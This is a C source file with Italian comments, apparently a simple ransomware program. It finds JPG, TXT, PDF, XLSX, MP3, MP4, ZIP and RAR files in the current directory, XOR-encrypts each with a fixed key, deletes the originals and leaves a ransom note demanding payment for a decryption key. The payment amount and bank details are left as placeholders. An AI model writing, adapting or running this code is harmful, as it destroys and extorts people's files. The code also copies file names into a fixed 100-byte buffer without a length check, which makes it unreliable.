#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

void cifratura(struct dirent *directory)
{
    struct dirent *dir = directory;
    FILE *fileOriginale, *fileCifrato;
    int chiave = 123;

    // Apertura del file originale in modalità lettura binaria
    fileOriginale = fopen(dir->d_name, "rb");
    if (fileOriginale == NULL)
    {
        perror("Errore nell'apertura del file originale");
        //return EXIT_FAILURE;
    }
    char nomeFileCifrato[100];
    strcpy(nomeFileCifrato, dir->d_name);
    strcat(nomeFileCifrato, ".encrypted");

    // Creazione o apertura del file cifrato in modalità scrittura binaria
    fileCifrato = fopen(nomeFileCifrato, "wb");
    if (fileCifrato == NULL)
    {
        perror("Errore nella creazione del file cifrato");
        fclose(fileOriginale);
        //return EXIT_FAILURE;
    }

    // Lettura di ogni byte dal file originale e cifratura
    int byte, byteCifrato;
    while ((byte = fgetc(fileOriginale)) != EOF)
    {
        byteCifrato = byte ^ chiave;     // Operazione XOR per la cifratura
        fputc(byteCifrato, fileCifrato); // Scrittura del byte cifrato nel file cifrato
    }

    // Chiusura dei file
    fclose(fileOriginale);
    fclose(fileCifrato);

    // Rimozione del file originale
    if (remove(dir->d_name) != 0)
    {
        perror("Errore nella rimozione del file originale");
        //return EXIT_FAILURE;
    }
}

int main()
{

    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d != NULL)
    {
        while ((dir = readdir(d)) != NULL)
        {
            char *ext = strrchr(dir->d_name, '.');
            if (ext != NULL && strcmp(ext, ".jpg") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".txt") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".pdf") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".xlsx") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".mp3") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".mp4") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".zip") == 0)
            {
                cifratura(dir);
            }
            if (ext != NULL && strcmp(ext, ".rar") == 0)
            {
                cifratura(dir);
            }

        }
    }
    closedir(d);
    FILE *readMeP;
    readMeP = fopen("READ ME.txt", "w");
    fprintf(readMeP, "Congratulazioni, i tuoi file sono stati tutti criptati. Per riavere i tuoi file indietro dovrai pagare xxx € a queste coordinate bancarie: YYY.\nUna volta che avrai pagato ti verrà comunicata una chiave che dovrai inserire nel programma eseguibile Prog_2. Attenzione: se sbagli l'inserimento della chiave il file eseguibile si cancellerà, quindi non tentare chiavi a caso.");
    fclose(readMeP);
    printf("Cifratura di tutti i file completata, i file originali sono stati rimossi. Maggiori informazioni nel file READ ME\n");
    return EXIT_SUCCESS;
}
